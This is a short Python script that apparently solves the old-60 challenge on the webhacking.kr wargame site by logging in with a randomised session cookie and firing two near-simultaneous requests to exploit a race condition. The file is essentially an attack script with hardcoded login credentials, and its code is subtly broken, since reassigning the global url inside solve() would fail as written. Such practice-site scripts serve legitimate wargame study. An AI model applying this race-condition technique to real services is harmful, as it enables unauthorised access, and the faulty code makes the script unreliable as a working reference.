import time
import random
import requests
from multiprocessing import Pool

url = "https://webhacking.kr/"

def login(sess):
    random.seed(time.time())
    rand = str(random.randint(1,10000000))
    sess.get(url)
    sess.cookies.clear()
    sess.cookies.update({'PHPSESSID':rand})
    datas = {"id":"hackintoanetwork","pw":"password"}
    res = sess.post(url=url+"login.php?login", data=datas)
    if "<script>location.href='/';</script>" in res.text:
        print("login success")
        
    else:
        print("login Fail")

def solve(param):
    sess = requests.session()
    login(sess)
    url = url + "challenge/web-37/?"
    payload = "mode={}".format(param)
    res = sess.get(url = url+payload)
    if "already solve" in res.text:
        print("already solve")
    elif "old-60 Pwned!" in res.text:
        print("old-60 Pwned!")

if __name__ == "__main__":
    p = Pool(4)
    ret1 = p.apply_async(solve,('',))
    time.sleep(0.3)
    ret2 = p.apply_async(solve,('auth',))
    p.close()
    p.join()


